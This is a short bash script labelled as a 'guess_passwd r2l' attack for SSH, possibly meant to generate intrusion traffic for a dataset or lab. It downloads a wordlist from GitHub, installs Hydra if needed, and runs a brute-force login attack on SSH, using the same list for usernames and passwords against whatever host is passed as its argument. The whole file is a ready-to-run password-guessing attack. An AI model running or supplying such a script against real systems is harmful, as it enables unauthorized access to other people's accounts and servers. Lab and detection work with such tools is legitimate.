#!/bin/bash

#guess_passwd r2l FOR SSH

# Create directory if not exists
mkdir -p guess_passwd
cd guess_passwd

# Check if wordlist exists
if [ ! -f ourwordlist.txt ]; then
    # If not, download
    wget https://raw.githubusercontent.com/SMBullet/Network-Attacks/main/Wordlists/ourwordlist.txt    #our wordlist
fi

# Install Hydra if not already installed
if ! command -v hydra &> /dev/null; then
    echo "Hydra is not installed. Installing..."
    sudo apt install hydra
fi

# Run Hydra for both username and password
hydra -L ourwordlist.txt -P ourwordlist.txt ssh://"$1"
